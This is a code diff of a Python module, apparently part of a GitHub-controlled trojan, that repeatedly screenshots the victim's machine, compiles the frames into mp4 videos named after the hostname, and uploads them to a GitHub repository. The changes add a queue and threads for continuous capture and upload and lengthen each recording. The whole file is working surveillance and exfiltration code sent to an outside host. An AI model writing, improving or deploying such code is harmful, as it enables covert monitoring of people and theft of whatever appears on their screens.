@@ -4,6 +4,7 @@ import github3
 import os
 from PIL import Image
 import pyautogui
+import queue
 import random
 import socket 
 import threading
@@ -33,7 +34,7 @@ IMAGE_DIR = './images/'
 VIDEO_DIR = './videos/'
 SLEEP_TIME = .25
 FPS = 4
-MOVIE_DURATION_IN_FRAMES = 20
+MOVIE_DURATION_IN_FRAMES = 240
 IMG_EXT = 'jpg'
 VIDEO_EXT = 'mp4'
 
@@ -74,39 +75,16 @@ class ScreenCapture:
         self.src_width, self.src_height = pyautogui.size()
         self.width = int(self.src_width)
         self.height = int(self.src_height)
-        self.videos = []
-        
-    def makeMovie(self, frames):
+        # self.videos = []
+        self.videoQueue =  queue.Queue()
 
-        now = datetime.now()
-        current_time = now.strftime('%H:%M:%S')
-        video_filename = f'{HOSTNAME}-{current_time}.{VIDEO_EXT}'
-        video_path = f'{VIDEO_DIR}{video_filename}'
-
-        #? Has to build a list of the videos to upload
-        self.videos.append(video_path)
-
-        fourcc = cv2.VideoWriter_fourcc('m', 'p', '4', 'v')
-        video = cv2.VideoWriter(video_path, fourcc, FPS, (self.width, self.height))
-        #? VideoWriter takes: output_name, fourcc, fps, size
-        #* https://docs.opencv.org/3.4/dd/d9e/classcv_1_1VideoWriter.html
-
-        for frame in frames:
-            video.write(cv2.imread(frame))
-
-        video.release()
-
-
+    
     def getScreen(self):
-
         imgs = []
         frame = 0
         cont = True
 
-        #? These must be cast to int, will return a float by default
-
         while cont == True:
-
             try:
                 image_path = f'{IMAGE_DIR}{HOSTNAME}-{frame}.{IMG_EXT}'
                 screenshot = pyautogui.screenshot()
@@ -124,40 +102,49 @@ class ScreenCapture:
                 cont = False
 
 
+    def makeMovie(self, frames):
 
-    def getVideoList(self):
-    #? Needed a method to get all videos
-        return self.videos
-
-    
-    def clearVideoList(self):
-    #? Needed a method to clear videos
+        now = datetime.now()
+        current_time = now.strftime('%Y:%-j:%H:%M:%S')
+        video_filename = f'{HOSTNAME}-{current_time}.{VIDEO_EXT}'
+        video_path = f'{VIDEO_DIR}{video_filename}'
         
-        for video in self.videos:
-            print(f'Deleting: {video}')
-            os.remove(video)
+        self.videoQueue.put(video_path)
 
-        self.videos = []
+        fourcc = cv2.VideoWriter_fourcc('m', 'p', '4', 'v')
+        video = cv2.VideoWriter(video_path, fourcc, FPS, (self.width, self.height))
+        #? VideoWriter takes: output_name, fourcc, fps, size
+        #* https://docs.opencv.org/3.4/dd/d9e/classcv_1_1VideoWriter.html
+
+        for frame in frames:
+            video.write(cv2.imread(frame))
+        video.release()
+
+
+    def getVideoQueue(self):
+    #? Needed a method to get all videos
+        return self.videoQueue
 
 
 class GithubUpload:
     def __init__(self) -> None:
         self.data_path = f'{REP_KEY_PTH}/{id}/'
         self.repo = github_connect()   
-        
 
-    def store_result(self, data, filename):
-        # file_name = datetime.now().isoformat()
-        remote_path = f'{REP_KEY_PTH}/{filename}'
-        #! Changed this line to store an mp4 file
-        bindata = bytes(data)
 
+    def store_result(self, video_path):
+        sleep(.25)
+        with open(video_path, 'rb') as file:
+            filename = video_path.split('/')
+            filename =  filename[2]
+            data = file.read()
+            remote_path = f'{REP_KEY_PTH}/{filename}'   
+            #! Changed this line to store an mp4 file
+            bindata = bytes(data)
 
         try:
             self.repo.create_file(remote_path, filename, bindata)
             print(f'File: {filename} created')
-            #? Human readable above
-            # self.repo.create_file(remote_path, message, base64.b64encode(bindata))
             #? This is the remote_path in the GitHub repo not on the local machine
             #* https://docs.github.com/en/rest/repos/contents?apiVersion=2022-11-28#create-a-file
             #? base64 encoded
@@ -167,43 +154,25 @@ class GithubUpload:
 
 def run(**args):
     sc = ScreenCapture()
-    # sc.getScreen()
-
-    # thread = threading.Thread(target=sc.getScreen())
-    # thread.start()
-
     gu = GithubUpload()
 
     while True:
-        # thread = threading.Thread(target=sc.getScreen())
-        # thread.start()
+        try:
+            screen_thread = threading.Thread(target=sc.getScreen)
+            screen_thread.start()
+            print(f'Threads: {threading.active_count()}')
+        except Exception as e:
+            print(f'Get Screen Exception: {e}')
 
-        sc.getScreen()
+        videos = sc.getVideoQueue()
+        video_path = videos.get()
 
-        rand = random.randrange(5,15)
-        # sleep(60*rand)
-        sleep(15)
-
-        videos = sc.getVideoList()
-
-        for video_path in videos:
-            # print(f'Video Path: {video_path}')
-            with open(video_path, 'rb') as file:
-
-                filename = video_path.split('/')
-                # print(f'Filename: {filename[2]}')
-                filename =  filename[2]
-
-                try:
-                    conent = file.read()
-                    gu.store_result(conent, filename) 
-                except Exception as e:
-                    print(f'Exception: {e}')
-
-
-        sc.clearVideoList()
-
-        # thread.join()
+        try:
+            upload_thread = threading.Thread(target=gu.store_result, args=(video_path,))
+            upload_thread.start()
+            print(f'Threads: {threading.active_count()}')
+        except Exception as e:
+            print(f'Exception: {e}')
 
 
 if __name__ == '__main__':
